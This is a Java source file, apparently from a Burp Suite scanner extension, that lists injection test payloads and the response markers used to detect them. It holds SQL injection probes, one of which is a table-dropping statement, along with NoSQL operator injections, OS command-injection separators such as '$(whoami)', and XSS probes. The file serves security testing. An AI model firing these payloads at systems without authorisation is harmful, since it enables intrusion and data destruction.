package com.security.burp.checks.active.injection;

import java.util.List;

/**
 * Static payload tables and detection markers shared by the injection check.
 * Splitting these out keeps {@code InjectionCheck} focused on orchestration.
 */
public final class InjectionPayloads {

    private InjectionPayloads() {}

    /** Auth-bypass / classic SQL injection probes. */
    public static final List<String> SQL = List.of(
            "' OR '1'='1",
            "' OR 1=1--",
            "1' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "\" OR \"1\"=\"1",
            "admin' --",
            "admin' #",
            "' OR 'a'='a",
            "') OR ('1'='1");

    /** Mongo-style operator-injection probes. */
    public static final List<String> NOSQL = List.of(
            "{\"$gt\":\"\"}",
            "{\"$ne\":null}",
            "{\"$ne\":\"\"}");

    /** OS-command separator + commands likely to produce recognisable output. */
    public static final List<String> COMMAND = List.of(
            "; ls",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "&& dir");

    /** Reflected-XSS probes. */
    public static final List<String> XSS = List.of(
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>");

    /** Substrings in a response body that suggest a SQL engine is leaking errors. */
    public static final List<String> SQL_ERROR_MARKERS = List.of(
            "sql syntax", "mysql", "postgresql", "ora-", "sqlite",
            "unclosed quotation", "syntax error");

    /** Substrings that suggest a NoSQL driver leaked an error. */
    public static final List<String> NOSQL_ERROR_MARKERS = List.of(
            "mongodb", "mongo", "casterror", "validationerror");

    /** Substrings that suggest a shell command actually executed. */
    public static final List<String> COMMAND_OUTPUT_MARKERS = List.of(
            "root:", "/bin/", "windows", "administrator");

    /** Substrings that suggest the OS attempted to execute the payload. */
    public static final List<String> COMMAND_ERROR_MARKERS = List.of(
            "command not found", "is not recognized");
}
